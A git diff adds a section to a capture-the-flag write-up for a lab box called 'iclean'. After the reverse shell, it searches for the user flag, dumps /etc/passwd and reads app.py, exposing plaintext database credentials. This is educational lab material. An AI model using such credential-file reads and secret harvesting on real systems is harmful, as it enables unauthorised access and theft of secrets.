@@ -302,6 +302,85 @@ Finally, change the code to read our script with curl and then pipe the output t
 
 After sending the payload, we get the reverse shell.
 
+Let's look for the user.txt flag.
+
+<div class="article-code">
+{% highlight sh %}
+www-data@iclean:/opt/app$ find / -name user.txt 2>/dev/null
+{% endhighlight %}
+</div>
+
+After using the command to try and find the user.txt flag across all directories and redirect stderr to `/dev/null` we get no results.
+
+This means we have to find the owner user of the user.txt flag. Let's take a look at the `/etc/passwd` file.
+
+<div class="article-code">
+{% highlight sh %}
+www-data@iclean:/opt/app$ cat /etc/passwd
+...
+geoclue:x:115:121::/var/lib/geoclue:/usr/sbin/nologin
+mysql:x:116:122:MySQL Server,,,:/nonexistent:/bin/false
+_laurel:x:998:998::/var/log/laurel:/bin/false
+{% endhighlight %}
+</div>
+
+We don't have any user accounts, but the presence of the MySQL service makes me remember that the website had login functionality. The db connection string secrects have to be stored either in enviroment tables or in the application python file itself.
+
+If we `ls` the current directory and read the `app.py` file, the db configurations are stored inside in plaintext.
+
+<div class="article-code">
+{% highlight sh %}
+www-data@iclean:/opt/app$ ls          
+ls
+app.py
+blank.pdf
+static
+templates
+www-data@iclean:/opt/app$ head -n 50 app.py 
+head -n 50 app.py
+from flask import Flask, render_template, request, jsonify, make_response, session, redirect, url_for
+from flask import render_template_string
+import pymysql
+import hashlib
+import os
+import random, string
+import pyqrcode
+from jinja2 import StrictUndefined
+from io import BytesIO
+import re, requests, base64
+
+app = Flask(__name__)
+
+app.config['SESSION_COOKIE_HTTPONLY'] = False
+
+secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
+app.secret_key = secret_key
+# Database Configuration
+db_config = {
+    'host': '127.0.0.1',
+    'user': 'iclean',
+    'password': 'pxCsmnGLckUb',
+    'database': 'capiclean'
+}
+{% endhighlight %}
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 [PortSwigger]: https://portswigger.net/support/using-sql-injection-to-bypass-authentication
 
